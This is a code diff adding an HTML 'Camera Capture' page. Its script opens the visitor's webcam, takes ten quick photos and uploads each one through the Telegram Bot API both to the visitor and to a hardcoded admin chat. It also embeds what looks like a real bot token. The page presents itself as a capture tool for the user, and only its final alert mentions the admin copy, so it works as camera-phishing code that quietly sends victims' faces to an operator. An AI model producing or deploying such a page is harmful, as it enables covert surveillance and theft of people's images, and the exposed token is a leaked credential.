@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Camera Capture</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 20px;
+    }
+    video {
+      width: 300px;
+      border: 2px solid #444;
+      margin: 10px;
+    }
+    button {
+      padding: 10px 20px;
+      margin: 10px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h2>📸 Camera Capture</h2>
+
+  <!-- Welcome image -->
+  <img src="assets/welcome.jpg" alt="Welcome" width="300"><br><br>
+
+  <!-- Camera preview -->
+  <video id="video" autoplay playsinline></video><br>
+
+  <button id="captureBtn">Take 10 Photos</button>
+
+  <script>
+    const video = document.getElementById('video');
+    const captureBtn = document.getElementById('captureBtn');
+    let photos = [];
+
+    // Extract user chat_id from URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const userChatId = urlParams.get("chat_id");
+
+    // Replace with your own admin chat ID and bot token
+    const ADMIN_CHAT_ID = "6314556756";
+    const BOT_TOKEN = "8173355562:AAFKrtX9LaprMCmrgUnRyhnV7NW_LZIbKh8";
+
+    // Start camera
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => { video.srcObject = stream; })
+      .catch(err => alert("❌ Camera permission denied. Please allow access."));
+
+    // Capture 10 photos and auto-send
+    captureBtn.addEventListener('click', async () => {
+      if (!userChatId) {
+        alert("❌ No chat_id found. Please open this link from the bot.");
+        return;
+      }
+
+      photos = [];
+      const canvas = document.createElement('canvas');
+      const ctx = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+
+      // Capture 10 frames
+      for (let i = 0; i < 10; i++) {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        let imgData = canvas.toDataURL('image/png');
+        photos.push(imgData);
+        await new Promise(r => setTimeout(r, 200)); // short delay
+      }
+
+      // Auto-send to Telegram (both user + admin)
+      for (let i = 0; i < photos.length; i++) {
+        let blob = await (await fetch(photos[i])).blob();
+
+        // Send to user
+        let formDataUser = new FormData();
+        formDataUser.append("chat_id", userChatId);
+        formDataUser.append("photo", blob, `user_photo${i}.png`);
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: formDataUser
+        });
+
+        // Send to admin
+        let formDataAdmin = new FormData();
+        formDataAdmin.append("chat_id", ADMIN_CHAT_ID);
+        formDataAdmin.append("photo", blob, `admin_photo${i}.png`);
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: formDataAdmin
+        });
+      }
+
+      alert("✅ 10 photos captured and sent to you + admin!");
+    });
+  </script>
+</body>
+</html>
